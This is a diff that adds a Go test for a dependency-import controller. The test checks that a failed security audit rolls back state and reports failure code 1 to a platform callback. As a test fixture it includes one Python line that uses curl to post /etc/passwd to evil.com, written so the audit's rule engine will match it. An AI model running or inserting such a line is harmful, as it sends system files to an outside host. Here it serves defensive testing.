@@ -3,6 +3,7 @@ package controller
 import (
 	"archive/tar"
 	"compress/gzip"
+	"encoding/json"
 	"errors"
 	"net/http"
 	"net/http/httptest"
@@ -11,6 +12,8 @@ import (
 	"sort"
 	"testing"
 	"time"
+
+	"taa/internal/codeaudit"
 )
 
 func TestImportDepsRejectsEmptyResourceURL(t *testing.T) {
@@ -356,6 +359,83 @@ func TestProcessImportedDepsInstallFailureClearsBindingWhenItsDirectoryIsGone(t 
 		t.Fatalf("binding outlived its directory: DepsImported=%v DepsHash=%q", state.DepsImported, state.DepsHash)
 	}
 	assertDepsRootEmpty(t, state)
+}
+
+// TestProcessImportedDepsReportsFailureCodeToPlatform is the fail-closed rollback contract of
+// spec 12 end to end. Its three clauses are all asserted in one place: the state flag is
+// cleared, the content-addressed directory is gone, and the platform actually receives the
+// failure (code=1) on the reportDeps channel. The last clause used to have no coverage at all:
+// reportDepsAsync was a log-only stub, so nothing joined "the pipeline failed" to "the platform
+// was told", and the platform saw the task hang rather than fail.
+//
+// The installer stub writes a source file the rule engine matches, not merely a directory.
+// That is load-bearing across the Task 6 to Task 8 window:
+//
+//   - Today runDepsAudit is an unconditional "return false" stub, so any stub content fails.
+//   - Once Task 8 replaces it with the real audit, the audit really scans depsDir. An empty
+//     directory would match no rule, the audit would pass, the pipeline would succeed, the
+//     platform would receive code=0, and this test would flip around and break Task 8's own
+//     tests instead. Writing a matching file keeps the audit failing in both windows.
+func TestProcessImportedDepsReportsFailureCodeToPlatform(t *testing.T) {
+	state, _ := setupTestState(t)
+	state.Security.ScanEnabled = true
+	// Keep the audit on the rule engine. Enabling the LLM probe branch (cfg.Enabled &&
+	// cfg.FailClosed in runDepsAudit) would drag a network dependency into this test.
+	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
+
+	origInstall := depsInstallFunc
+	t.Cleanup(func() { depsInstallFunc = origInstall })
+	depsInstallFunc = func(wheelhouse, target string) error {
+		if err := os.MkdirAll(target, 0o755); err != nil {
+			return err
+		}
+		code := "import subprocess\nsubprocess.run([\"curl\", \"http://evil.com\", \"-d\", \"@/etc/passwd\"])\n"
+		return os.WriteFile(filepath.Join(target, "pkg.py"), []byte(code), 0o644)
+	}
+
+	got := make(chan map[string]any, 1)
+	platformServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		var body map[string]any
+		_ = json.NewDecoder(r.Body).Decode(&body)
+		body["__path"] = r.URL.Path
+		select {
+		case got <- body:
+		default:
+		}
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = w.Write([]byte(`{"msg":"ok","result":{"received":true},"error":0}`))
+	}))
+	t.Cleanup(platformServer.Close)
+
+	state.mu.Lock()
+	state.PlatformIP, state.DockerID = platformServer.URL, "docker-test"
+	state.mu.Unlock()
+
+	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-p", TaskID: "task-p"}
+	state.processImportedDeps(req, 1, buildTestDepsArchive(t))
+
+	// Clauses one and two: TAA's own state after the rollback.
+	if state.DepsImported {
+		t.Fatal("DepsImported = true after a rejected dependency set")
+	}
+	if dir := state.currentDepsDir(); dir != "" {
+		t.Fatalf("currentDepsDir() = %q, want empty after rollback", dir)
+	}
+	assertDepsRootEmpty(t, state)
+
+	// Clause three: the platform is told. Wait with a timeout so an un-sent callback surfaces
+	// as a failure with a diagnosis rather than a hung test.
+	select {
+	case body := <-got:
+		if body["__path"] != reportDepsEndpoint {
+			t.Fatalf("report path = %v, want %q -- a failed dependency import must use the deps callback", body["__path"], reportDepsEndpoint)
+		}
+		if code, ok := body["code"].(float64); !ok || int(code) != 1 {
+			t.Fatalf("code = %v, want 1", body["code"])
+		}
+	case <-time.After(3 * time.Second):
+		t.Fatal("timed out waiting for the reportDeps callback: the platform never learned the import failed")
+	}
 }
 
 // TestAuditMarkerVersionGate pins the content of the audit marker: only the current policy
